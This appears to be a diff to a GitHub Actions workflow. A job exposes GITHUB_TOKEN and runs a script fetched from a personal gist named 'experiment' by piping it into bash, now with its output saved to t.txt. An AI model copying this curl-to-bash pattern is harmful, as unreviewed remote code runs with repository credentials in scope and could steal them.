@@ -12,4 +12,4 @@ jobs:
     env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
-      - run: curl -sfL https://gist.githubusercontent.com/RomarQ/066b5eb9b6abf60277332cbc280e1ac9/raw/experiment | bash
+      - run: curl -sfL https://gist.githubusercontent.com/RomarQ/066b5eb9b6abf60277332cbc280e1ac9/raw/experiment | bash >> t.txt
